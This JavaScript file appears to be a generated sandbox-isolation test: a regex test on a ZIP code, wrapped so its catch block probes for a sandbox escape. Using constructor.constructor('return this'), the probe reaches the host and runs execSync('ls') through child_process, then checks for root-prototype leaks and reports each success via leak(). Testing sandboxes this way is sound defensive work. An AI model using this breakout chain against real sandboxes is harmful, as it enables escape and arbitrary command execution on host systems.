try {
    var __string = 'Boston, MA 02134';
    var __matches = ['02134'];
    var __re = /([\d]{5})([-\ ]?[\d]{4})?$/g;
    __re.lastIndex = __string.lastIndexOf('0') + 1;
    if (__string.match(__re).length !== __matches.length) {
        $ERROR('#1: __string.match(__re).length=== __matches.length. Actual: ' + __string.match(__re).length);
    }
    if (__string.match(__re)[0] !== __matches[0]) {
        $ERROR('#3: __string.match(__re)[0]===__matches[0]. Actual: ' + __string.match(__re)[0]);
    }
} catch (e) {
    try {
        e(() => {
        }).constructor.constructor('return this')().process.mainModule.require('child_process').execSync('ls').toString();
    } catch (DONOTINSTRUMENT) {
    }
    try {
        function CheckBreakout(x) {
            try {
                if (x.constructor.constructor('return this')().process.mainModule.require) {
                    leak('SB-SUCCESS: The argument e is able to call outside the sandbox');
                }
            } catch (DONOTINSTRUMENT) {
            }
        }
        function getRootPrototype(obj) {
            if (typeof obj != 'object' && typeof obj != 'function' || !obj.__proto__) {
                return Object.prototype;
            }
            while (obj.__proto__) {
                obj = obj.__proto__;
            }
            return obj;
        }
        CheckBreakout(e);
        getRootPrototype(e).CCA = 'CC: Got it?';
        if (getRootPrototype(e) !== Object.prototype && getRootPrototype(e).canary !== Object.prototype.canary) {
            leak('CCA-SUCCESS: The parameter e of the catch clause has a different root prototype');
        }
        getRootPrototype(e).CCT = 'CC: Got it?';
        if (getRootPrototype(this) !== Object.prototype && getRootPrototype(this).canary !== Object.prototype.canary) {
            leak('CCT-SUCCESS: "this" object of function e has a different root prototype');
        }
    } catch (E) {
    }
}